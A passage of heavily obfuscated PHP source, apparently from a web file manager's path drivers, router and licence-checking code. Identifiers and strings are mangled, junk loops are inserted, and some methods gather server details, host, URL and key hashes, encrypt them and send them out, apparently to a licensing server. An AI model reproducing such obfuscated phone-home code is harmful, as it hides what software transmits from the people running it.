Action($ª¡´ÌéÔ[1169])->shareItemInfo($‚ŠêšúÃ[$ª¡´ÌéÔ[1330]]); } foreach ($‚ŠêšúÃ as $ûıââ™’ => $ç‚¹Ìª) { if (!in_array($ûıââ™’, array($ª¡´ÌéÔ[93], $ª¡´ÌéÔ[92]))) { continue; } foreach ($ç‚¹Ìª as $şìñÈ® => $ÒÅğğÏÚ) { $‚ŠêšúÃ[$ûıââ™’][$şìñÈ®] = Action($ª¡´ÌéÔ[1169])->shareItemInfo($ÒÅğğÏÚ); } } return $‚ŠêšúÃ; } public function listAll($¢‚‘Õå) { $¸×µöÀ =& $_SERVER[¤·²È‰º]; $Šú«’¡À = IO::info($this->pathParse[$¸×µöÀ[94]]); if (!$Šú«’¡À) { return array(); } $Œ¼öÒÜá = $this->model->listAll($¢‚‘Õå); foreach ($Œ¼öÒÜá as &$À€££ê) { $À€££ê[$¸×µöÀ[96]] = Action($¸×µöÀ[1169])->shareItemInfo($À€££ê[$¸×µöÀ[96]]); } unset($À€££ê); return $Œ¼öÒÜá; } } class PathDriverDriverShareItem { public function __construct($ÊŒ³‡Ü¼) { $this->pathParse = $ÊŒ³‡Ü¼; } public function __call($ª‚ºåïô, $ŒÕŒÌˆÙ) { $ÂíÀ‘‚ =& $_SERVER[¤·²È‰º]; if (method_exists($this, $ª‚ºåïô)) { return; } $‰Ê¾üŠÉ = call_user_func_array(array($ÂíÀ‘‚[1331], $ª‚ºåïô), $ŒÕŒÌˆÙ); $óª÷¾Ó… = array($ÂíÀ‘‚[1332], $ÂíÀ‘‚[1333], $ÂíÀ‘‚[1334], $ÂíÀ‘‚[1335], $ÂíÀ‘‚[563], $ÂíÀ‘‚[565], $ÂíÀ‘‚[1336], $ÂíÀ‘‚[117], $ÂíÀ‘‚[1337], $ÂíÀ‘‚[1338]); if (in_array($ª‚ºåïô, $óª÷¾Ó…)) { $‰Ê¾üŠÉ = $this->getPathOuter($‰Ê¾üŠÉ); } return $‰Ê¾üŠÉ; } public function copy($İºœ‹¨‡, $·ÑÀ…Ûæ, $¯û²Ù²é = false, $éÖÓ¿ú = false) { return $this->copyMove($İºœ‹¨‡, $·ÑÀ…Ûæ, $¯û²Ù²é, $_SERVER[¤·²È‰º][563], $éÖÓ¿ú); } public function move($ö¡ Ïüˆ, $Áûë¸¬±, $«òÊªÒË = false, $­ôÜ©ä¨ = false) { return $this->copyMove($ö¡ Ïüˆ, $Áûë¸¬±, $«òÊªÒË, $_SERVER[¤·²È‰º][565], $­ôÜ©ä¨); } private function copyMove($¢ñØ¸­ê, $•§âù¤, $™¨œ·Ÿ®, $ˆ‘¶½¥¥, $àîö¢©Í = false) { $™çÏÂÚ =& $_SERVER[¤·²È‰º]; $ãı°ÑÆ£ = $•§âù¤; $üØ®ö¡Ü = IO::driverMake($•§âù¤); if ($üØ®ö¡Ü->pathParse[$™çÏÂÚ[1145]]) { $•§âù¤ = $üØ®ö¡Ü->pathParse[$™çÏÂÚ[1145]]; } else { $•§âù¤ = $ãı°ÑÆ£; } $àç Ç« = IO::copyMove($¢ñØ¸­ê, $•§âù¤, $™¨œ·Ÿ®, $ˆ‘¶½¥¥, $àîö¢©Í); $àç Ç« = $this->getPathOuter($àç Ç«); return $àç Ç«; } public function pathThis($ÎÂ–Ë“«) { return get_path_this($this->pathParse[$_SERVER[¤·²È‰º][94]]); } public function pathFather($ÈƒÂ»€¥) { return get_path_father($this->pathParse[$_SERVER[¤·²È‰º][94]]); } public function iconvSystem($Œˆû¤ã¼) { return $Œˆû¤ã¼; } protected function infoParse($¯Šìğ¹·, $Ëšğ€ = false) { $™£ªÅ’è =& $_SERVER[¤·²È‰º]; $Šû¨Œá = $this->pathParse[$™£ªÅ’è[495]][$™£ªÅ’è[1170]] . $this->pathParse[$™£ªÅ’è[1163]]; if ($Ëšğ€) { $´ÉµØÊæ = IO::infoWithChildren($Šû¨Œá); } else { $´ÉµØÊæ = IO::info($Šû¨Œá); } $îÀ÷Œ˜ = $this->pathParse[$™£ªÅ’è[495]]; return Action($™£ªÅ’è[1329])->_shareItemeParse($´ÉµØÊæ, $îÀ÷Œ˜); } public function listAll($İ°Á¬›) { $é‹î©Õ¡ =& $_SERVER[¤·²È‰º]; $©í·–ò¤ = IO::listAll($İ°Á¬›); $¿‚Ê·¤ = $this->pathParse[$é‹î©Õ¡[495]]; foreach ($©í·–ò¤ as &$ìÉ’ê£) { check_abort(); $ë¦ş¢¤Ú = IO::info($ìÉ’ê£[$é‹î©Õ¡[94]]); $ë¦ş¢¤Ú = is_array($ë¦ş¢¤Ú) ? $ë¦ş¢¤Ú : array(); $ìÉ’ê£ = array_merge($ë¦ş¢¤Ú, $ìÉ’ê£); $ìÉ’ê£[$é‹î©Õ¡[96]] = Action($é‹î©Õ¡[1329])->_shareItemeParse($ìÉ’ê£, $¿‚Ê·¤); } unset($ìÉ’ê£); return $©í·–ò¤; } public function getPathOuter($áª¾‹åÅ) { $„­ÉÌ =& $_SERVER[¤·²È‰º]; $™±…şù = KodIO::parse($áª¾‹åÅ); if ($™±…şù[$„­ÉÌ[43]] == KodIO::KOD_SHARE_ITEM) { return $™±…şù[$„­ÉÌ[94]]; } $¾Ô¾Òã = KodIO::clear($áª¾‹åÅ); $¦™’±Í = KodIO::clear($this->pathParse[$„­ÉÌ[495]][$„­ÉÌ[1170]]); $èÉˆêÂÃ = substr($¾Ô¾Òã, strlen($¦™’±Í)); if (substr($¾Ô¾Òã, 0, strlen($¦™’±Í)) != $¦™’±Í) { return !1; } return $this->pathParse[$„­ÉÌ[1164]] . $„­ÉÌ[8] . ltrim($èÉˆêÂÃ, $„­ÉÌ[8]); } public function getType() { $û¹»ß±ó =& $_SERVER[¤·²È‰º]; $¯Ôğ÷ùö = str_replace($û¹»ß±ó[84], $û¹»ß±ó[12], get_class($this)); return strtolower($¯Ôğ÷ùö); } public function isTypeObject($‘´Šœñ) { return IO::isTypeObject($‘´Šœñ); } public function info($ç•«ß¿¤) { return $this->infoParse($ç•«ß¿¤); } public function infoAuth($ğº¦î) { return $this->infoParse($ğº¦î); } public function infoWithChildren($ëÍ¿ª×) { return $this->infoParse($ëÍ¿ª×, !0); } public function infoFull($øÌğ¬êÁ) { return $this->infoParse($øÌğ¬êÁ); } } goto d®š‚À†Í˜; d—¤·Ö‚éÕ: $clvqmkjxfs = $_SERVER[¤·²È‰º][626]; class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($š•¤´´ø) { $ŞÊä¹é• =& $_SERVER[¤·²È‰º]; $ÏÖ€Ëš =& $_SERVER[ŸÛı·­]; $şËŒáˆ = explode($ÏÖ€Ëš[0], trim($š•¤´´ø, $ÏÖ€Ëš[0])); $ÊœŠúù… = $ŞÊä¹é•[627]; if (strlen($ÊœŠúù…) < $ŞÊä¹é•[628]) { die; } $this->defaultModule = $şËŒáˆ[0] ? $şËŒáˆ[0] : $this->defaultModule; $òïèö  = $ŞÊä¹é•[629]; if (!$òïèö ) { die; } $this->defaultController = $şËŒáˆ[1] ? $şËŒáˆ[1] : $this->defaultController; $õ¨™áª» = $ŞÊä¹é•[630]; while ($õ¨™áª» < $ŞÊä¹é•[628]) { if ($õ¨™áª» >= 0) { break; } $õ¨™áª»++; } $this->defaultAction = $şËŒáˆ[2] ? $şËŒáˆ[2] : $this->defaultAction; $»üğ™Š = $ŞÊä¹é•[631]; while (strlen($»üğ™Š) < $ŞÊä¹é•[628]) { if (!$»üğ™Š) { break; } $»üğ™Š++; } $this->jpzu373923d1($ÏÖ€Ëš[1], array($this, $ÏÖ€Ëš[2])); } public function appRun($¦®ì·è) { $ıçí¾£¶ =& $_SERVER[¤·²È‰º]; $áÉ¢öêÈ =& $_SERVER[ŸÛı·­]; $²Ÿøèèõ = explode($áÉ¢öêÈ[0], $¦®ì·è); $Ò°Ë§ö‡ = $ıçí¾£¶[632]; if (!$Ò°Ë§ö‡) { die; } $Æú¶ˆÁØ = strtolower($²Ÿøèèõ[0]); $ÉÍŒğÇ = $áÉ¢öêÈ[3]; $´ïÅÃœ = $ıçí¾£¶[633]; if (strlen($´ïÅÃœ) < $ıçí¾£¶[628]) { die; } if ($Æú¶ˆÁØ == $áÉ¢öêÈ[4]) { $ÉÍŒğÇ = $áÉ¢öêÈ[5]; $²Ÿøèèõ[0] = $áÉ¢öêÈ[6]; $²Ÿøèèõ[1] = $²Ÿøèèõ[1] . $áÉ¢öêÈ[7]; $¦®ì·è = join($áÉ¢öêÈ[0], $²Ÿøèèõ); $¦®ì·è = trim($¦®ì·è, $áÉ¢öêÈ[0]); } call_user_func(array($áÉ¢öêÈ[8], $áÉ¢öêÈ[9]), $ÉÍŒğÇ . $áÉ¢öêÈ[10], $¦®ì·è); ActionCall($¦®ì·è); call_user_func(array($áÉ¢öêÈ[8], $áÉ¢öêÈ[9]), $ÉÍŒğÇ . $áÉ¢öêÈ[11], $¦®ì·è); } private function autorun() { $ÄÎ”Ÿ†– =& $_SERVER[ŸÛı·­]; global $config; if (count($config[$ÄÎ”Ÿ†–[12]]) == 0) { return; } foreach ($config[$ÄÎ”Ÿ†–[12]] as $­¬Ü­ğ£ => $ª†å¬ƒ) { $this->appRun($ª†å¬ƒ); } } private function nkita6570006() { $º„ÛÎ¼  =& $_SERVER[¤·²È‰º]; $Õıàäª… =& $_SERVER[ŸÛı·­]; $ìĞ°æ÷ = $Õıàäª…[4]; $Ñ§¢ò‡ = $GLOBALS[$Õıàäª…[13]][$Õıàäª…[14]][0]; $£œáàËÛ = $º„ÛÎ¼ [634]; while ($£œáàËÛ < $º„ÛÎ¼ [19]) { if ($£œáàËÛ >= 0) { break; } $£œáàËÛ++; } if (!$Ñ§¢ò‡ || strlen($Ñ§¢ò‡) <= strlen($ìĞ°æ÷)) { return; } if (strtolower(substr($Ñ§¢ò‡, -strlen($ìĞ°æ÷))) != $ìĞ°æ÷) { return; } $üªŠë¹ = substr($Ñ§¢ò‡, 0, -strlen($ìĞ°æ÷)); $¿êÅ¦œÔ = array($Õıàäª…[4], $üªŠë¹); $„¤û¡È = $º„ÛÎ¼ [635]; if (!$„¤û¡È) { return; } $õ‚øÁœ¬ = array_slice($GLOBALS[$Õıàäª…[13]][$Õıàäª…[14]], 1); $Ş¥ŞĞˆ† = $º„ÛÎ¼ [636]; if (strlen($Ş¥ŞĞˆ†) < $º„ÛÎ¼ [637]) { return; } $GLOBALS[$Õıàäª…[13]][$Õıàäª…[14]] = array_merge($¿êÅ¦œÔ, $õ‚øÁœ¬); $GLOBALS[$Õıàäª…[13]][$Õıàäª…[15]] = implode($Õıàäª…[0], $GLOBALS[$Õıàäª…[13]][$Õıàäª…[14]]); } private function micl0b0f692b() { $İËü¯¼ù =& $_SERVER[¤·²È‰º]; $·ıöôÚû =& $_SERVER[ŸÛı·­]; if ($GLOBALS[$·ıöôÚû[13]][$·ıöôÚû[15]] != $·ıöôÚû[6]) { return; } $ƒÓğ’…Ä = $_SERVER[$·ıöôÚû[16]]; $¸ö·í˜İ = $İËü¯¼ù[638]; if (strlen($¸ö·í˜İ) < $İËü¯¼ù[637]) { die; } $º¨÷Å¯ü = $·ıöôÚû[17]; if (!strstr($ƒÓğ’…Ä, $º¨÷Å¯ü)) { return; } $ÓãĞ©›† = strrpos($ƒÓğ’…Ä, $º¨÷Å¯ü); $ÜİìÉ½ = $İËü¯¼ù[639]; while ($ÜİìÉ½ < $İËü¯¼ù[623]) { if ($ÜİìÉ½ >= 0) { break; } $ÜİìÉ½++; } $üëÀÜšé = substr($ƒÓğ’…Ä, $ÓãĞ©›† + strlen($º¨÷Å¯ü)); $µ£”‚£® = $İËü¯¼ù[640]; preg_match_all($·ıöôÚû[18], $üëÀÜšé, $ˆ‰ûã‡); $üëÀÜšé = trim($ˆ‰ûã‡[0][0], $·ıöôÚû[19]); $GLOBALS[$·ıöôÚû[13]][$·ıöôÚû[14]] = explode($·ıöôÚû[19], $üëÀÜšé); $GLOBALS[$·ıöôÚû[13]][$·ıöôÚû[15]] = implode($·ıöôÚû[0], $GLOBALS[$·ıöôÚû[13]][$·ıöôÚû[14]]); $ÛÚÙš¬ˆ = $İËü¯¼ù[641]; while (strlen($ÛÚÙš¬ˆ) < $İËü¯¼ù[19]) { if (!$ÛÚÙš¬ˆ) { break; } $ÛÚÙš¬ˆ++; } } public function run() { $º¤¬ÏÖ¨ =& $_SERVER[¤·²È‰º]; $¹üŠÙëÈ =& $_SERVER[ŸÛı·­]; $this->micl0b0f692b(); $this->nkita6570006(); $ª¹ôı¤ˆ = $º¤¬ÏÖ¨[642]; if (!$ª¹ôı¤ˆ) { return; } $ğ”·Úç® = $GLOBALS[$¹üŠÙëÈ[13]][$¹üŠÙëÈ[14]]; $çìà®–‘ = $º¤¬ÏÖ¨[643]; $»ïÍ¡Ş³ = $GLOBALS[$¹üŠÙëÈ[13]][$¹üŠÙëÈ[15]]; $ª×š©¥ = $º¤¬ÏÖ¨[644]; if (strlen($ª×š©¥) < $º¤¬ÏÖ¨[637]) { die; } define($¹üŠÙëÈ[20], isset($ğ”·Úç®[0]) && $ğ”·Úç®[0] ? $ğ”·Úç®[0] : $this->defaultModule); $áåˆèæ = $º¤¬ÏÖ¨[645]; if (strlen($áåˆèæ) < $º¤¬ÏÖ¨[637]) { die; } define($¹üŠÙëÈ[21], isset($ğ”·Úç®[1]) && $ğ”·Úç®[0] ? $ğ”·Úç®[1] : $this->defaultController); $Ûàº¨ôŠ = $º¤¬ÏÖ¨[646]; if (strlen($Ûàº¨ôŠ) < $º¤¬ÏÖ¨[628]) { return; } define($¹üŠÙëÈ[22], isset($ğ”·Úç®[2]) && $ğ”·Úç®[0] ? $ğ”·Úç®[2] : $this->defaultAction); $éÚ‹ıª = $º¤¬ÏÖ¨[647]; if (!$éÚ‹ıª) { return; } define($¹üŠÙëÈ[23], MOD . $¹üŠÙëÈ[0] . ST . $¹üŠÙëÈ[0] . ACT); $€ßÄÀò = $º¤¬ÏÖ¨[648]; if (!$€ßÄÀò) { return; } $_SERVER[$¹üŠÙëÈ[24]] = strtolower(ACTION); $this->autorun(); if (count($ğ”·Úç®) >= 3) { $this->appRun($»ïÍ¡Ş³); } else { $this->appRun(ACTION); } } private $pudf35a4411b = array(); private $earl399e790e = ''; public function sdom6aee624f() { $åæÆåí =& $_SERVER[¤·²È‰º]; $Ó¹’ƒ•ê =& $_SERVER[ŸÛı·­]; $this->izhj70bbe8d9(); $»ƒè¢Ô = $åæÆåí[649]; if (!$»ƒè¢Ô) { die; } $this->ltuq26457cf8(); $this->xnfi3f35936a(); $Ëœšéùœ = $åæÆåí[650]; while ($Ëœšéùœ < $åæÆåí[19]) { if ($Ëœšéùœ >= 0) { break; } $Ëœšéùœ++; } $this->wmsl0407a7d9(); $°ëªûõ = $åæÆåí[626]; while ($°ëªûõ < $åæÆåí[19]) { if ($°ëªûõ >= 0) { break; } $°ëªûõ++; } $this->yigza544b90f(); $this->tifa50fbaa7b(); $this->eofs0d2f4cfc(); $¯°úÅ¤ = $åæÆåí[651]; if (strlen($¯°úÅ¤) < $åæÆåí[637]) { die; } $this->jpzu373923d1($Ó¹’ƒ•ê[25], array($this, $Ó¹’ƒ•ê[26])); $ úó”®ß = $åæÆåí[652]; while (strlen($ úó”®ß) < $åæÆåí[623]) { if (!$ úó”®ß) { break; } $ úó”®ß++; } $this->jpzu373923d1($Ó¹’ƒ•ê[27], array($this, $Ó¹’ƒ•ê[28])); $this->jpzu373923d1($Ó¹’ƒ•ê[29], array($this, $Ó¹’ƒ•ê[30])); $­ƒÔŞ‡Ù = $åæÆåí[653]; if (strlen($­ƒÔŞ‡Ù) < $åæÆåí[654]) { die; } $this->jpzu373923d1($Ó¹’ƒ•ê[31], array($this, $Ó¹’ƒ•ê[32])); $›‰¯š²¼ = $åæÆåí[655]; if (!$›‰¯š²¼) { die; } } public function obtafaf48a4a($ÁÎö®ˆÉ) { $ß°’ñÄè =& $_SERVER[¤·²È‰º]; $‚‘Âóï =& $_SERVER[ŸÛı·­]; $Üü‡ÒÙ = Model($‚‘Âóï[33])->get(); $Ê—á¡»Ã = array($‚‘Âóï[34], $‚‘Âóï[35], $‚‘Âóï[36], $‚‘Âóï[37], $‚‘Âóï[38], $‚‘Âóï[39], $‚‘Âóï[40], $‚‘Âóï[41], $‚‘Âóï[42], $‚‘Âóï[43], $‚‘Âóï[44], $‚‘Âóï[45], $‚‘Âóï[46], $‚‘Âóï[47], $‚‘Âóï[48], $‚‘Âóï[49], $‚‘Âóï[50], $‚‘Âóï[51], $‚‘Âóï[52], $‚‘Âóï[53], $‚‘Âóï[54], $‚‘Âóï[55], $‚‘Âóï[56], $‚‘Âóï[57], $‚‘Âóï[58], $‚‘Âóï[59], $‚‘Âóï[60], $‚‘Âóï[61], $‚‘Âóï[62], $‚‘Âóï[63], $‚‘Âóï[64], $‚‘Âóï[65], $‚‘Âóï[66], $‚‘Âóï[67], $‚‘Âóï[68], $‚‘Âóï[69], $‚‘Âóï[70], $‚‘Âóï[71], $‚‘Âóï[72], $‚‘Âóï[73], $‚‘Âóï[74], $‚‘Âóï[75], $‚‘Âóï[76], $‚‘Âóï[77], $‚‘Âóï[78], $‚‘Âóï[79], $‚‘Âóï[80], $‚‘Âóï[81], $‚‘Âóï[82], $‚‘Âóï[83]); $ßûøœî¸ = $ß°’ñÄè[656]; if (strlen($ßûøœî¸) < $ß°’ñÄè[19]) { die; } foreach ($Ê—á¡»Ã as $ÖóàÛ—®) { $şæÍÇ”“ = $GLOBALS[$‚‘Âóï[84]][$‚‘Âóï[85]][$ÖóàÛ—®]; if (isset($Üü‡ÒÙ[$ÖóàÛ—®])) { $şæÍÇ”“ = $Üü‡ÒÙ[$ÖóàÛ—®]; } $ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$ÖóàÛ—®] = $şæÍÇ”“; } $‚š– úú = $ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$‚‘Âóï[46]]; unset($ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[88]][$‚‘Âóï[89]]); unset($ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[88]][$‚‘Âóï[90]]); unset($ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$‚‘Âóï[46]]); unset($ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$‚‘Âóï[91]]); $ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$‚‘Âóï[92]] = array($‚‘Âóï[93] => (int) $‚š– úú[$‚‘Âóï[94]], $‚‘Âóï[95] => (int) _get($‚š– úú, $‚‘Âóï[96], 0)); $¡¼ëáÍÔ = $ß°’ñÄè[657]; if (strlen($¡¼ëáÍÔ) < $ß°’ñÄè[19]) { die; } $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[98]] = Action($‚‘Âóï[99])->accessToken(); $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[100]] = md5($_SERVER[$‚‘Âóï[101]] . $Üü‡ÒÙ[$‚‘Âóï[102]]); $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[103]] = base64_encode(serverInfo()); $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[104]] = $this->earl399e790e; $½‘êªÚÔ = $ß°’ñÄè[658]; if (!$½‘êªÚÔ) { return; } if ($Üü‡ÒÙ[$‚‘Âóï[104]] != $‚‘Âóï[105]) { $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[106]] = $Üü‡ÒÙ[$‚‘Âóï[106]]; $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[107]] = $Üü‡ÒÙ[$‚‘Âóï[107]]; $êÃÁîè = rand_string(10) . $this->earl399e790e . rand_string(5); $ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[108]][$‚‘Âóï[109]] = $this->osnr6f5b8126($êÃÁîè, $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[100]]); } if ($this->earl399e790e == $‚‘Âóï[105]) { $ÁÎö®ˆÉ[$‚‘Âóï[86]][$‚‘Âóï[87]][$‚‘Âóï[92]][$‚‘Âóï[96]] = 0; } $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[110]] = _get($this->pudf35a4411b, $‚‘Âóï[111], $‚‘Âóï[6]); $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[112]] = _get($this->pudf35a4411b, $‚‘Âóï[113], $‚‘Âóï[6]); $ìà‰å‹ = $ß°’ñÄè[659]; if (strlen($ìà‰å‹) < $ß°’ñÄè[19]) { die; } if (_get($GLOBALS, $‚‘Âóï[114]) && $this->config[$‚‘Âóï[115]]) { $ÁÎö®ˆÉ[$‚‘Âóï[97]][$‚‘Âóï[116]] = WEB_ROOT; } return $ÁÎö®ˆÉ; } private function tifa50fbaa7b() { $ÌÚÎÛ‘¢ =& $_SERVER[¤·²È‰º]; $Ÿáåç¦© =& $_SERVER[ŸÛı·­]; $º›Ì‘’¿ = $_SERVER[$Ÿáåç¦©[24]] == $Ÿáåç¦©[117]; $›Ú“şÛ² = $ÌÚÎÛ‘¢[660]; if (strlen($›Ú“şÛ²) < $ÌÚÎÛ‘¢[637]) { return; } if ($_SERVER[$Ÿáåç¦©[24]] == $Ÿáåç¦©[118] && $_GET[$Ÿáåç¦©[119]] == $Ÿáåç¦©[120]) { $º›Ì‘’¿ = !0; } if ($º›Ì‘’¿) { $œ°™Ï¶í = array($Ÿáåç¦©[104] => $this->earl399e790e, $Ÿáåç¦©[121] => $this->ugwm60f14f64(), $Ÿáåç¦©[122] => Model($Ÿáåç¦©[123])->count()); if ($this->earl399e790e != $Ÿáåç¦©[105]) { $²Â±Æáµ = _get($this->pudf35a4411b, $Ÿáåç¦©[124]); if ($²Â±Æáµ) { $œ°™Ï¶í[$Ÿáåç¦©[125]] = $²Â±Æáµ; $œ°™Ï¶í[$Ÿáåç¦©[126]] = strtotime(_get($this->pudf35a4411b, $Ÿáåç¦©[127])); $œ°™Ï¶í[$Ÿáåç¦©[128]] = _get($this->pudf35a4411b, $Ÿáåç¦©[113]); } $¢ÓµÊ€Æ = Model($Ÿáåç¦©[33])->get($Ÿáåç¦©[129], $Ÿáåç¦©[6], !0); if (is_string($¢ÓµÊ€Æ) && substr($¢ÓµÊ€Æ, 0, 1) == $Ÿáåç¦©[130]) { $¢ÓµÊ€Æ = json_decode_force($¢ÓµÊ€Æ); } if (is_array($¢ÓµÊ€Æ) && $¢ÓµÊ€Æ[$Ÿáåç¦©[131]] && strstr($¢ÓµÊ€Æ[$Ÿáåç¦©[131]], $Ÿáåç¦©[132])) { $¶ĞË¹· = explode($Ÿáåç¦©[132], $¢ÓµÊ€Æ[$Ÿáåç¦©[131]]); $œ°™Ï¶í[$Ÿáåç¦©[133]] = $¶ĞË¹·[0]; } } $œ°™Ï¶í = $this->kvcod433917a(json_encode($œ°™Ï¶í), md5($Ÿáåç¦©[134])); $ïŸá›ã¬ = array($Ÿáåç¦©[135] => $œ°™Ï¶í); $û¸ÉÛ§ = $ÌÚÎÛ‘¢[661]; while (strlen($û¸ÉÛ§) < $ÌÚÎÛ‘¢[628]) { if (!$û¸ÉÛ§) { break; } $û¸ÉÛ§++; } call_user_func(array($Ÿáåç¦©[136], $Ÿáåç¦©[137]), $ïŸá›ã¬); } if ($this->earl399e790e == $Ÿáåç¦©[105]) { return; } $ÚĞŸ³äÓ = array($Ÿáåç¦©[138], $Ÿáåç¦©[139], $Ÿáåç¦©[140], $Ÿáåç¦©[141], $Ÿáåç¦©[142], $Ÿáåç¦©[143]); $×íƒ±ÛÀ = Model($Ÿáåç¦©[33])->get(); $ïŸá›ã¬ = array($Ÿáåç¦©[144] => $×íƒ±ÛÀ[$Ÿáåç¦©[34]], $Ÿáåç¦©[145] => $×íƒ±ÛÀ[$Ÿáåç¦©[35]], $Ÿáåç¦©[146] => $Ÿáåç¦©[6]); $˜»²¥çŒ = $ÌÚÎÛ‘¢[662]; if (strlen($˜»²¥çŒ) < $ÌÚÎÛ‘¢[654]) { die; } foreach ($ÚĞŸ³äÓ as $§ú³ĞŒğ) { if (!isset($×íƒ±ÛÀ[$§ú³ĞŒğ]) || !$×íƒ±ÛÀ[$§ú³ĞŒğ]) { continue; } $ïŸá›ã¬[$§ú³ĞŒğ] = $×íƒ±ÛÀ[$§ú³ĞŒğ]; } call_user_func(array($Ÿáåç¦©[136], $Ÿáåç¦©[137]), $ïŸá›ã¬); $ş§Û“Å = $ÌÚÎÛ‘¢[663]; if (strlen($ş§Û“Å) < $ÌÚÎÛ‘¢[654]) { return; } } private function wmsl0407a7d9() { $¨ƒñ¢‡ó =& $_SERVER[¤·²È‰º]; $ã‘¸©­ø =& $_SERVER[ŸÛı·­]; if ($_SERVER[$ã‘¸©­ø[24]] != $ã‘¸©­ø[147]) { return; } if (!_get($GLOBALS, $ã‘¸©­ø[114])) { die; } $ìŒ»«êë = $GLOBALS[$ã‘¸©­ø[13]]; if (isset($ìŒ»«êë[$ã‘¸©­ø[148]])) { $this->jbya8e5aab3b(); die; } if (!isset($ìŒ»«êë[$ã‘¸©­ø[149]]) || strlen($ìŒ»«êë[$ã‘¸©­ø[149]]) != 16) { show_json($ã‘¸©­ø[150] . $ìŒ»«êë[$ã‘¸©­ø[149]], !1); } $˜ Â¬éñ = Model($ã‘¸©­ø[33])->get($ã‘¸©­ø[102]); $ûÙ¤îå‡ = md5($_SERVER[$ã‘¸©­ø[101]] . $˜ Â¬éñ); $’Å’Å£ = array($ã‘¸©­ø[149] => $ìŒ»«êë[$ã‘¸©­ø[149]], $ã‘¸©­ø[151] => rand_string(16), $ã‘¸©­ø[152] => $ã‘¸©­ø[134], $ã‘¸©­ø[153] => $ã‘¸©­ø[154], $ã‘¸©­ø[155] => $_SERVER[$ã‘¸©­ø[156]], $ã‘¸©­ø[157] => $_SERVER[$ã‘¸©­ø[158]], $ã‘¸©­ø[159] => $_SERVER[$ã‘¸©­ø[160]], $ã‘¸©­ø[100] => $ûÙ¤îå‡, $ã‘¸©­ø[161] => Model($ã‘¸©­ø[33])->get($ã‘¸©­ø[129])); if ($ìŒ»«êë[$ã‘¸©­ø[162]] == $ã‘¸©­ø[163]) { $°‘Ÿö¥Æ = $this->kvcod433917a($ûÙ¤îå‡, $ã‘¸©­ø[164]); $Ğºç°¦í = $this->osnr6f5b8126(json_encode($’Å’Å£), $ûÙ¤îå‡ . $ã‘¸©­ø[165], 3); $Ğºç°¦í = $Ğºç°¦í . $ã‘¸©­ø[166] . $_SERVER[$ã‘¸©­ø[156]]; $³Ş˜ŠŞ = $this->nmpo8871366d($ã‘¸©­ø[167] . $°‘Ÿö¥Æ . $ã‘¸©­ø[168] . $Ğºç°¦í, -1); show_json($³Ş˜ŠŞ, !0); } else { if ($ìŒ»«êë[$ã‘¸©­ø[162]] == $ã‘¸©­ø[169]) { $’Ã°¨íë = substr(md5($ã‘¸©­ø[170] . $ûÙ¤îå‡), 12, 15) . $ã‘¸©­ø[171]; $Ğºç°¦í = $this->ojmieef403fc(trim($ìŒ»«êë[$ã‘¸©­ø[172]]), $’Ã°¨íë, 2); $à—¼†ÊÍ = json_decode($Ğºç°¦í, !0); if (!is_array($à—¼†ÊÍ) || !is_array($à—¼†ÊÍ[$ã‘¸©­ø[173]]) || $à—¼†ÊÍ[$ã‘¸©­ø[149]] != !0) { $äŞ»µÄ· = $ã‘¸©­ø[174]; $éæÖ¾­õ = $à—¼†ÊÍ[$ã‘¸©­ø[173]] ? $ã‘¸©­ø[175] . $à—¼†ÊÍ[$ã‘¸©­ø[173]] : $äŞ»µÄ·; show_json($éæÖ¾­õ, !1); } else { $’Å’Å£[$ã‘¸©­ø[151]] = $à—¼†ÊÍ[$ã‘¸©­ø[173]][$ã‘¸©­ø[176]]; } } else { $à—¼†ÊÍ = $this->nmpo8871366d($ã‘¸©­ø[177], $’Å’Å£, 10); } } if (!is_array($à—¼†ÊÍ) || !is_array($à—¼†ÊÍ[$ã‘¸©­ø[173]]) || $à—¼†ÊÍ[$ã‘¸©­ø[149]] != !0) { $äŞ»µÄ· = LNG($ã‘¸©­ø[178]); $éæÖ¾­õ = $à—¼†ÊÍ[$ã‘¸©­ø[173]] ? $ã‘¸©­ø[175] . $à—¼†ÊÍ[$ã‘¸©­ø[173]] : $äŞ»µÄ·; show_json($éæÖ¾­õ, !1); } $ÇöÛùà = $à—¼†ÊÍ[$ã‘¸©­ø[173]]; $ş´’ŒÔ = $this->mipuf4acd80d($ÇöÛùà[$ã‘¸©­ø[179]]); if (!$ş´’ŒÔ || $ş´’ŒÔ != $ÇöÛùà[$ã‘¸©­ø[127]]) { $šéõöÉ = array($ã‘¸©­ø[180] => Model($ã‘¸©­ø[33])->get($ã‘¸©­ø[102]), $ã‘¸©­ø[181] => $_SERVER[$ã‘¸©­ø[101]], $ã‘¸©­ø[182] => this_url(), $ã‘¸©­ø[157] => $_SERVER[$ã‘¸©­ø[158]]); $Ğºç°¦í = $this->wdxke40142f7(json_encode($šéõöÉ)); $this->nmpo8871366d($ã‘¸©­ø[183] . $Ğºç°¦í); show_json(LNG($ã‘¸©­ø[184]), !0); } $Š«ÅÌ¼ò = array($ã‘¸©­ø[185] => $ÇöÛùà[$ã‘¸©­ø[186]], $ã‘¸©­ø[187] => $ÇöÛùà[$ã‘¸©­ø[188]], $ã‘¸©­ø[189] => rand_string(16), $ã‘¸©­ø[104] => $ÇöÛùà[$ã‘¸©­ø[190]]); if 